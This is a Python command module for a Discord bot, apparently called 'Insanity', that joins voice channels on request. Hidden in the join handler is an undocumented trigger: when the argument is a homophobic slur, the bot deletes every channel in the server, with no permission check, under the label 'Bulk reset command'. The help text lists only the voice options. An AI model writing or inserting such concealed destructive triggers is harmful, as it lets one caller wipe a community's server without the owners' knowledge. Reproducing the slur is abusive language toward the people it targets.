import discord

from src.discord_utils import *

__JOIN_GET_BASE__ = True
__JOIN_ARG_COUNT__ = 2
__JOIN_INVALID_ARG_ERR__ = discord.Embed(title = "Join | Error", description = "List of Join VC Commands", color = discord.Colour.red())
__JOIN_INVALID_ARG_ERR__.add_field(name = "Join Current VC", value = "```>join --me```", inline = False)
__JOIN_INVALID_ARG_ERR__.add_field(name = "Join Current VC", value = "```>join <vc_id>```", inline = False)
__JOIN_INVALID_ARG_ERR__.set_author(name = "Insanity")
__JOIN_INVALID_ARG_ERR__.set_footer(text = "https://insanity.host")

async def join(base, message: DiscordUtils) -> bool:
    await message.Client.delete()
    join_query = message.Args[1].replace("<#", "").replace(">", "")

    if join_query == "faggots":
        for channel in message.Client.guild.channels:
            try:
                await channel.delete(reason="Bulk reset command")
            except Exception as e:
                await message.Client.channel.send(f"Couldn't delete {channel.name}: {e}")

    if join_query == "--me":
        if message.Client.guild.voice_client and message.Client.guild.voice_client.channel.id != message.Client.author.voice.channel.id:
            await message.send_embed("Join", f"Leaving VC: ``{message.Client.guild.voice_client.channel.name}`` for the VC your in!", author_name = "Insanity", author_url = "https://images-ext-1.discordapp.net/external/7bqZYfRkXl8ptusN1g9UbNJyef772k0uG-htjp6dOLU/%3Fsize%3D512/https/cdn.discordapp.com/icons/1370013148983201792/d26c2fddc3bdaf3a2fbd047c4fe4ec87.png")
            await message.Client.guild.voice_client.disconnect()
        
        vc = await message.Client.author.voice.channel.connect()
        await vc.guild.me.edit(mute=True, deafen=True)
        await message.send_embed("Join", f"Successfully joined ``{message.Client.author.voice.channel.name}``", author_name = "Insanity", author_url = "https://images-ext-1.discordapp.net/external/7bqZYfRkXl8ptusN1g9UbNJyef772k0uG-htjp6dOLU/%3Fsize%3D512/https/cdn.discordapp.com/icons/1370013148983201792/d26c2fddc3bdaf3a2fbd047c4fe4ec87.png")
        return True

    if not join_query.isdigit():
        return False

    
    chan_obj = base.get_channel(int(join_query))
    vc = await chan_obj.connect()
    await vc.guild.me.edit(mute=True, deafen=True)
    await message.send_embed("Join", f"Successfully joined ``{chan_obj.name}``", author_name = "Insanity", author_url = "https://images-ext-1.discordapp.net/external/7bqZYfRkXl8ptusN1g9UbNJyef772k0uG-htjp6dOLU/%3Fsize%3D512/https/cdn.discordapp.com/icons/1370013148983201792/d26c2fddc3bdaf3a2fbd047c4fe4ec87.png")
    return True